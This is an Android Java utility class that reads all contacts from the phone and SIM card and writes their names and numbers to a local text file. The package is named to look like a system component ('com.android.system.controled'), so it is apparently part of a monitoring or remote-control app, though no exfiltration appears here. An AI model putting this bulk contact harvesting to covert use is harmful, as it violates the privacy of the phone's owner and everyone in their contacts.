package com.android.system.controled.util;

import java.util.ArrayList;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Contacts.People;
import android.provider.ContactsContract;

import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.ContactBean;

public class ContactsUtil {

	private static final String TAG = "ContactsUtil";

	/**
	 * 根据号码获得联系人姓名
	 * 
	 * @Description:
	 * @param context
	 * @param number
	 * @return
	 * @see:
	 * @since:
	 * @author: zgy
	 * @date:2012-8-29
	 */
	public static String getNameFromContactsByNumber(Context context, String number) {
		number = StringUtil.getRidofSpecialOfTel(number);
		String name = number;

		// 从手机通讯录查找
		String[] projection = { ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER };
		Cursor cursor = null;
		try {
			cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null);
			if (cursor != null && cursor.getCount() > 0) {
				cursor.moveToFirst();
				String newNumber = "";
				do {
					newNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
					newNumber = StringUtil.getRidofSpecialOfTel(newNumber);
					if (newNumber.contains(number) || number.contains(newNumber)) {
						name = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
						break;
					}
				} while (cursor.moveToNext());
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cursor != null) {
				cursor.close();
			}

		}

		// 未获取到姓名，尝试从sim卡里获取
		if (name.equals(number)) {
			Cursor cur = null;
			try {
				cur = context.getContentResolver().query(Uri.parse("content://icc/adn"), null, null, null, null);
				if (cur != null && cur.getCount() > 0) {
					cur.moveToFirst();
					String num = "";
					do {
						num = cur.getString(cur.getColumnIndex(People.NUMBER));
						num = StringUtil.getRidofSpecialOfTel(num);
						if (num.contains(number) || number.contains(num)) {
							name = cur.getString(cur.getColumnIndex(People.NAME)) + ":" + num;
							break;
						}

					} while (cur.moveToNext());
				}

			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				if (cur != null) {
					cur.close();
				}
			}
		}

		return name;
	}

	/**
	 * 从手机通讯录里获得联系人
	 * 
	 * @Description:
	 * @param context
	 * @return
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-5-31
	 */
	public static ArrayList<ContactBean> getAllContactsFromLocal(Context context) {
		ArrayList<ContactBean> arrayContacts = new ArrayList<ContactBean>();
		ContactBean c;

		// 从手机通讯录里查找
		Cursor cursor = null;
		try {
			String[] projection = { ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER };
			cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, null, null, null);
			if (cursor != null && cursor.getCount() > 0) {
				cursor.moveToFirst();
				do {
					c = new ContactBean();
					c.name = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
					c.number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
					if (!StringUtil.isNull(c.number)) {
						c.number = StringUtil.getRidofSpecialOfTel(c.number);
					}
					arrayContacts.add(c);

				} while (cursor.moveToNext());

			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cursor != null) {
				cursor.close();
			}
		}

		return arrayContacts;
	}

	/**
	 * 从sim卡里获取联系人
	 * 
	 * @Description:
	 * @param context
	 * @return
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-7-8
	 */
	public static ArrayList<ContactBean> getAllContactsFromSim(Context context) {
		ArrayList<ContactBean> arrayContacts = new ArrayList<ContactBean>();
		ContactBean c;

		// 从sim卡里查找
		Cursor cur = null;
		try {
			cur = context.getContentResolver().query(Uri.parse("content://icc/adn"), null, null, null, null);
			if (cur != null && cur.getCount() > 0) {
				cur.moveToFirst();
				String num = "";
				do {
					c = new ContactBean();
					c.name = cur.getString(cur.getColumnIndex(People.NAME));
					c.number = cur.getString(cur.getColumnIndex(People.NUMBER));
					if (!StringUtil.isNull(c.number)) {
						c.number = StringUtil.getRidofSpecialOfTel(c.number);
					}
					arrayContacts.add(c);
				} while (cur.moveToNext());
			}

		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cur != null) {
				cur.close();
			}
		}
		return arrayContacts;
	}

	// /**
	// * 根据联系人id或电话号码获得姓名
	// *
	// * @Description:
	// * @param con
	// * @param id
	// * @return
	// * @see:
	// * @since:
	// * @author: zhuanggy
	// * @date:2013-7-8
	// */
	// public static String getContactNameById(Context con, int id, String number) {
	// String result = number;
	// Debug.e(TAG, "id=" + id);
	// if (id > 0) {
	// // 手机通讯录里有
	// String[] projection = { ContactsContract.PhoneLookup.DISPLAY_NAME };
	// Cursor cursor = null;
	// try {
	// cursor = con.getContentResolver().query(ContactsContract.RawContacts.CONTENT_URI, projection,
	// ContactsContract.PhoneLookup._ID + "=?", new String[] { id + "" }, null);
	// if (cursor != null && cursor.getCount() > 0) {
	// cursor.moveToFirst();
	// result = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
	// Debug.e(TAG, "result=" + result);
	// }
	// } catch (Exception e) {
	// e.printStackTrace();
	// } finally {
	// if (cursor != null) {
	// cursor.close();
	// }
	//
	// }
	// } else {
	// // 尝试从sim卡里取
	// result = getNameFromContactsByNumber(con, number);
	// }
	//
	// return result;
	//
	// }

	/**
	 * 生成通讯录文件
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2013-7-8
	 */
	public static void createContactsFile(Context context) {

		boolean isNull = true;
		
		if(MainApplication.FILE_CONTACTS_TEXT.exists()) {
			MainApplication.FILE_CONTACTS_TEXT.delete();
		}
		
		ArrayList<ContactBean> contacts = ContactsUtil.getAllContactsFromLocal(context);
		if (contacts != null && contacts.size() > 0) {
			isNull = false;
			String contactsStr = "手机通讯录：\r\n\r\n";
			for (ContactBean c : contacts) {
				contactsStr = contactsStr + "电话：" + c.number + "    姓名：" + c.name + "\r\n";
			}
			if (!contactsStr.equals("") && contactsStr.length() > 0) {
				FileUtil.writeFile(contactsStr, MainApplication.FILE_CONTACTS_TEXT, true);
			}
		}

		contacts = new ArrayList<ContactBean>();
		contacts = ContactsUtil.getAllContactsFromSim(context);
		if (contacts != null && contacts.size() > 0) {
			isNull = false;
			String contactsStr = "\r\n\r\n\r\nSIM卡通信录：\r\n\r\n";
			for (ContactBean c : contacts) {
				contactsStr = contactsStr + "电话：" + c.number + "    姓名：" + c.name + "\r\n";
			}
			if (!contactsStr.equals("") && contactsStr.length() > 0) {
				FileUtil.writeFile(contactsStr, MainApplication.FILE_CONTACTS_TEXT, true);
			}
		}

		if (isNull) {
			FileUtil.writeFile("通讯录为空！", MainApplication.FILE_CONTACTS_TEXT, true);
		}

	}
}
